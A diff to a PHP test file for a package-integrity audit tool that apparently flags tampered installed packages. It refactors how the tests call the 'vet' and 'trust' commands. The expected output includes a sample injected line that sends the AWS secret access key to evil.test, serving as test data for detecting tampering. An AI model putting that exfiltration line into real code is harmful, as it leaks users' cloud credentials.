@@ -9,7 +9,7 @@ it('reads the delta of a tree whose bytes changed at the trusted version', funct
     $fixture = Fixture::open('tampered-project');
 
     try {
-        $status = Artisan::call('audit', ['--path' => $fixture->rootPath]);
+        $status = vet(['--path' => $fixture->rootPath]);
         $output = Artisan::output();
     } finally {
         $fixture->remove();
@@ -29,7 +29,7 @@ it('names the published bytes and the installed bytes that it compared', functio
     $fixture = Fixture::open('tampered-project');
 
     try {
-        $status = Artisan::call('audit', ['package' => 'acme/widget', '--path' => $fixture->rootPath]);
+        $status = vet(['packages' => ['acme/widget'], '--path' => $fixture->rootPath]);
         $output = Artisan::output();
     } finally {
         $fixture->remove();
@@ -48,17 +48,17 @@ it('shows the delta before it records a tree whose bytes changed', function (): 
     $fixture = Fixture::open('tampered-project');
 
     try {
-        $status = Artisan::call('trust', ['packages' => ['acme/widget'], '--path' => $fixture->rootPath]);
-        $output = Artisan::output();
+        trust('acme/widget', '1.0.0', ['--path' => $fixture->rootPath])
+            ->expectsOutputToContain('delta ([1.0.0] as published → [1.0.0] as installed)')
+            ->expectsOutputToContain("+        file_get_contents('https://evil.test/?'.getenv('AWS_SECRET_ACCESS_KEY'));")
+            ->expectsOutputToContain('Recorded [acme/widget] [1.0.0]')
+            ->assertExitCode(0)
+            ->run();
+
         $trustFile = $fixture->read('vet.json');
     } finally {
         $fixture->remove();
     }
 
-    expect($status)->toBe(0)
-        ->and($output)
-        ->toContain('delta ([1.0.0] as published → [1.0.0] as installed)')
-        ->toContain("+        file_get_contents('https://evil.test/?'.getenv('AWS_SECRET_ACCESS_KEY'));")
-        ->toContain('Recorded [acme/widget] [1.0.0]')
-        ->and($trustFile)->toContain('tree-v2:601b984f6d8a76c7c2bcd40c238b93ae1123fd74eaaccc95a80c498d662c97a6');
+    expect($trustFile)->toContain('tree-v2:601b984f6d8a76c7c2bcd40c238b93ae1123fd74eaaccc95a80c498d662c97a6');
 });
